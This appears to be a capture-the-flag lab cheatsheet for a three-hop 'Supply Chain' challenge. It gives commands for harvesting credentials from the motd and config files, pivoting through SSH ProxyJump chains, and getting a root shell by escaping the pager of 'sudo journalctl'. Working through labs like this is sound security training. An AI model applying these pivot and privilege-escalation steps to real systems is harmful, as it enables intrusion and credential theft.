# Cheatsheet — Supply Chain

## Targets

- **bastion01** → **app01** → **db01** — three hops, one flag each

## Useful commands

```bash
ssh deployer@bastion01                        # creds in the motd
cat ~/DEPLOY.txt                              # loot the runbook
ssh -J deployer@bastion01 app@app01           # ProxyJump hop 2
sudo -l
sudo journalctl                               # in the pager: !/bin/sh
cat /opt/app/config.yml                       # db creds
ssh -J deployer@bastion01,app@app01 dba@db01  # two-hop jump list
sudo cat /root/db.txt

# ~/.ssh/config alternative — then plain `ssh db01`
Host bastion01
  HostName <bastion-ip>
  User deployer
Host app01
  ProxyJump bastion01
  User app
Host db01
  ProxyJump bastion01,app01
  User dba
```

## Concepts

- Each hop's filesystem is recon for the next hop — never stop looting
- -J chains left→right: bastion,app01 means "via bastion then app01"
- nftables drops ≠ unreachable — they mean "come from the right source"
